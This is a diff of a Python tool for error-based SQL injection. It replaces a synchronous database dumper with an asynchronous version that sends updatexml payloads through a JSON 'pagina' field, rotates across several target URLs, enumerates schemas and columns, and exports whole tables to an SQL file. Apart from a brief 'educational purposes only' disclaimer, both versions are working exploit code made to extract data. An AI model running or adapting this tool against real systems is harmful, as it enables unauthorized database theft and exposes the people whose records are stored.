@@ -1,3 +1,4 @@
+
 """
 DISCLAIMER:
 This tool is intended for educational purposes only.
@@ -5,227 +6,137 @@ Use only in authorized environments.
 Unauthorized use of this tool may be illegal.
 """
 
-import argparse
-import requests
+import asyncio
+import httpx
 import re
-import time
-import urllib3
+import argparse
+import random
+import os
+from itertools import cycle
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-
-class SQLDumper:
-    def __init__(self, url, timeout=5):
-        self.url = url
+class UniversalSQLiDumper:
+    def __init__(self, urls, target_id, max_concurrency=7, batch_size=15, timeout=25):
+        self.endpoints = cycle(urls)
+        self.target_id = target_id
         self.timeout = timeout
+        self.batch_size = batch_size
+        self.semaphore = asyncio.Semaphore(max_concurrency)
+        self.headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Security-Audit/2.2",
+            "Content-Type": "application/json"
+        }
 
-    def _send_payload(self, payload):
-        data = {"pagina": payload, "url": "a", "agencia": 77}
-
-        try:
-            response = requests.post(
-                self.url,
-                json=data,
-                timeout=self.timeout,
-                verify=False
-            )
-
-            match = re.search(r"Duplicate entry '~([^~]+)~", response.text)
-            if match:
-                return match.group(1)
-
-        except Exception:
-            pass
-
+    async def _fetch(self, client, payload, retries=3):
+        target_url = next(self.endpoints)
+        for _ in range(retries):
+            async with self.semaphore:
+                try:
+                    injection = f"x', (updatexml(1,concat(0x7e,(SELECT {payload}),0x7e),1))) -- -"
+                    response = await client.post(
+                        target_url,
+                        json={"pagina": injection, "id": self.target_id},
+                        timeout=self.timeout,
+                        headers=self.headers
+                    )
+                    match = re.search(r"XPATH syntax error: '~([^~]*)~'", response.text)
+                    if match: return match.group(1)
+                    return None
+                except Exception:
+                    await asyncio.sleep(random.uniform(0.5, 1.5))
         return None
 
-    def _extract_list(self, query_template, offset):
+    def _sql_safe(self, val, dtype):
+        if val is None or val.lower() == 'null': return "NULL"
+        if any(t in dtype.lower() for t in ['int', 'float', 'decimal']):
+            clean_num = "".join(c for c in val if c in "0123456789.-")
+            return clean_num if clean_num else "NULL"
+        return f"'{val.replace(\"'\", \"''\")}'"
+
+    async def dump_table(self, client, db, table, columns, f):
+        print(f"\n" + "="*80)
+        print(f"[*] ACTIVE EXTRACTION: {db}.{table}")
+        print("="*80)
         
-        payload = (
-            "x', (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, ("
-            f"{query_template} LIMIT {offset},1"
-            "), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)) -- -"
-        )
-        return self._send_payload(payload)
+        col_names = [c['name'] for c in columns]
+        header = " | ".join(f"{name.upper():<20}" for name in col_names)
+        print(header)
+        print("-" * len(header))
 
-    def get_databases(self):
-        """Enumerates all databases."""
-        databases = []
+        query_base = f"CONCAT_WS(0x7c, {', '.join(col_names)}) FROM {db}.{table}"
         offset = 0
 
         while True:
-            db = self._extract_list(
-                "SELECT schema_name FROM information_schema.schemata",
-                offset
-            )
-            if not db:
+            tasks = [self._fetch(client, f"{query_base} LIMIT {offset + i},1") 
+                     for i in range(self.batch_size)]
+            results = await asyncio.gather(*tasks)
+            valid_rows = [r for r in results if r is not None]
+
+            for row in valid_rows:
+                parts = row.split('|')
+                vals_sql = [self._sql_safe(parts[i] if i < len(parts) else "NULL", columns[i]['type']) 
+                            for i in range(len(columns))]
+                f.write(f"INSERT INTO `{table}` VALUES ({', '.join(vals_sql)});\n")
+                
+                console_row = " | ".join(f"{str(parts[i])[:19]:<20}" if i < len(parts) else "NULL                " 
+                                        for i in range(len(col_names)))
+                print(console_row)
+                offset += 1
+
+            if len(valid_rows) > 0:
+                f.flush()
+            
+            if len(valid_rows) < self.batch_size:
+                print("-" * len(header))
+                print(f"[OK] {table} completed. Total rows: {offset}")
                 break
 
-            databases.append(db)
-            offset += 1
-            time.sleep(0.5)
-
-        return databases
-
-    def get_tables(self, database):
-      
-        tables = []
-        offset = 0
-
-        db_hex = database.encode().hex()
-
+    async def get_db_structure(self, client, db_name):
+        print(f"\n[!] Mapping Schema: {db_name}...")
+        db_hex = db_name.encode().hex()
+        structure = {}
+        t_idx = 0
         while True:
-            query = (
-                "SELECT table_name FROM information_schema.tables "
-                f"WHERE table_schema=0x{db_hex}"
-            )
+            t_name = await self._fetch(client, f"table_name FROM information_schema.tables WHERE table_schema=0x{db_hex} LIMIT {t_idx},1")
+            if not t_name: break
+            
+            print(f"    [+] Detected: {t_name}")
+            t_hex = t_name.encode().hex()
+            cols = []
+            c_idx = 0
+            while True:
+                c_data = await self._fetch(client, f"CONCAT(column_name,0x7c,data_type) FROM information_schema.columns WHERE table_schema=0x{db_hex} AND table_name=0x{t_hex} LIMIT {c_idx},1")
+                if not c_data or '|' not in c_data: break
+                name, dtype = c_data.split('|')
+                cols.append({'name': name, 'type': dtype})
+                c_idx += 1
+            
+            structure[t_name] = cols
+            t_idx += 1
+        return structure
 
-            table = self._extract_list(query, offset)
-            if not table:
-                break
+    async def start_audit(self, db_name):
+        async with httpx.AsyncClient(verify=False) as client:
+            struct = await self.get_db_structure(client, db_name)
+            output_file = f"EXPORT_{db_name}.sql"
+            
+            with open(output_file, 'w', encoding='utf-8') as f:
+                f.write(f"CREATE DATABASE IF NOT EXISTS `{db_name}`;\nUSE `{db_name}`;\n")
+                
+                for table, columns in struct.items():
+                    f.write(f"\nDROP TABLE IF EXISTS `{table}`;\nCREATE TABLE `{table}` (\n")
+                    f.write(",\n".join([f"  `{c['name']}` TEXT" for c in columns]) + "\n) ENGINE=InnoDB;\n")
+                    await self.dump_table(client, db_name, table, columns, f)
 
-            tables.append(table)
-            offset += 1
-            time.sleep(0.5)
-
-        return tables
-
-    def get_columns(self, table, database=None):
-        columns = []
-        offset = 0
-
-        table_hex = table.encode().hex()
-
-        if database:
-            db_hex = database.encode().hex()
-            query = (
-                "SELECT column_name FROM information_schema.columns "
-                f"WHERE table_name=0x{table_hex} AND table_schema=0x{db_hex}"
-            )
-        else:
-            query = (
-                "SELECT column_name FROM information_schema.columns "
-                f"WHERE table_name=0x{table_hex}"
-            )
-
-        while True:
-            col = self._extract_list(query, offset)
-            if not col:
-                break
-
-            columns.append(col)
-            offset += 1
-            time.sleep(0.5)
-
-        return columns
-
-    def get_table_data(self, table, columns, limit=None):
-        data = []
-        offset = 0
-
-        concat_cols = ", ':', ".join(columns)
-        concat_expr = f"CONCAT({concat_cols})" if len(columns) > 1 else columns[0]
-
-        while True:
-            query = f"SELECT {concat_expr} FROM {table} LIMIT {offset},1"
-            row = self._extract_list(query, 0)
-
-            if not row:
-                break
-
-            values = row.split(':')
-            data.append(dict(zip(columns, values)))
-
-            offset += 1
-            if limit and offset >= limit:
-                break
-
-            time.sleep(0.5)
-
-        return data
-
-    def dump_all(self, output_file):
-        
-        with open(output_file, 'w', encoding='utf-8') as f:
-
-            print("[*] Retrieving databases...")
-            databases = self.get_databases()
-
-            f.write(f"-- Databases found: {len(databases)}\n")
-
-            for db in databases:
-                f.write(f"CREATE DATABASE IF NOT EXISTS `{db}`;\n")
-                f.write(f"USE `{db}`;\n\n")
-
-                print(f"[*] Processing database: {db}")
-
-                tables = self.get_tables(db)
-
-                for table in tables:
-                    print(f"    -> Table: {table}")
-
-                    columns = self.get_columns(table, db)
-
-                    f.write(f"DROP TABLE IF EXISTS `{table}`;\n")
-
-                    create_stmt = f"CREATE TABLE `{table}` (\n"
-                    for col in columns:
-                        create_stmt += f"  `{col}` TEXT,\n"
-
-                    create_stmt = create_stmt.rstrip(',\n') + "\n);\n"
-                    f.write(create_stmt)
-
-                    data = self.get_table_data(table, columns)
-
-                    for row in data:
-                        values = [str(v).replace("'", "''") for v in row.values()]
-
-                        values_str = ", ".join(f"'{v}'" for v in values)
-                        columns_str = ", ".join(f"`{c}`" for c in columns)
-
-                        insert_stmt = (
-                            f"INSERT INTO `{table}` ({columns_str}) "
-                            f"VALUES ({values_str});\n"
-                        )
-
-                        f.write(insert_stmt)
-
-                    f.write("\n")
-
-                f.write("\n")
-
-        print(f"[+] Dump completed. Saved to {output_file}")
-
-
-def main():
-    parser = argparse.ArgumentParser(
-        description="Database dump via error-based SQL injection"
-    )
-
-    parser.add_argument(
-        "-u", "--url",
-        required=True,
-        help="Target vulnerable endpoint URL"
-    )
-
-    parser.add_argument(
-        "-o", "--output",
-        default="dump.sql",
-        help="Output file (default: dump.sql)"
-    )
-
-    parser.add_argument(
-        "--timeout",
-        type=float,
-        default=5.0,
-        help="Request timeout in seconds"
-    )
-
-    args = parser.parse_args()
-
-    dumper = SQLDumper(args.url, args.timeout)
-    dumper.dump_all(args.output)
-
+        print(f"\n\n[PROCESS COMPLETED]")
+        print(f"-> Log generated at: {os.path.abspath(output_file)}")
 
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser(description="Universal Asynchronous SQLi Dumper")
+    parser.add_argument("-u", "--urls", required=True)
+    parser.add_argument("-i", "--id", type=int, required=True)
+    parser.add_argument("-d", "--db", required=True)
+    args = parser.parse_args()
+
+    target_list = [u.strip() for u in args.urls.split(',')]
+    dumper = UniversalSQLiDumper(target_list, args.id)
+    asyncio.run(dumper.start_audit(args.db))
